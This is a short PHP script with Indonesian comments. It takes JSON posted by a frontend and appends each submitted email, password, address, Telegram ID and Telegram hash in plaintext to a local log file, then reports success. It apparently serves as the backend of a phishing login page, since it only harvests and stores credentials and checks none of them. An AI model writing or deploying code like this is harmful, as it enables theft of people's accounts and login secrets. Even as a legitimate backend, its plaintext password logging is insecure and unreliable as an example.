<?php
// Terima data JSON dari frontend
$json = file_get_contents('php://input');
$data = json_decode($json, true);

// Simpan log atau proses data
$log = "Email: " . $data['email'] . "\n";
$log .= "Password: " . $data['password'] . "\n";
$log .= "Alamat: " . $data['address'] . "\n";
$log .= "Telegram ID: " . $data['telegram_id'] . "\n";
$log .= "Hash: " . $data['telegram_hash'] . "\n";
$log .= "Waktu: " . $data['timestamp'] . "\n---\n";

// Simpan ke file (opsional)
file_put_contents('log-login.txt', $log, FILE_APPEND);

// Kirim respons sukses ke frontend
echo json_encode([
    'status' => 'success',
    'message' => 'Data diterima'
]);
?>
